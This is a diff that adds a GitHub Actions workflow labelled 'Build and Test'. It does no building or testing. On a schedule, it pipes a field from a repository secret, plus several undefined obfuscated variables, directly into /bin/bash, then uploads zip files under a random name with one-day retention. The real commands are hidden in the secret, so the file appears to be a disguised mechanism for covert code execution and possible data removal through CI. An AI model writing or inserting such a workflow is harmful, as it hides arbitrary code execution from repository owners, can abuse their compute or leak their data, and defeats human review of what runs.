@@ -1,0 +1,33 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          n6: ${{ secrets.n6 }}
+        run: |
+          printf '%s' "$n6" | jq -r .kz5 | /bin/bash
+          echo $z4452 | jq -r .kxu1288 | /bin/bash
+          echo $p5239 | jq -r .s3965 | /bin/bash
+          printf '%s' "$tmgf01226" | jq -r .xngsg100 | /bin/bash
+          printf '%s' "$h1265" | jq -r .vt55 | /bin/bash
+          printf '%s' "$ug14683" | jq -r .le4 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: YHnmVzrl
+          path: "*.zip"
+          retention-days: 1
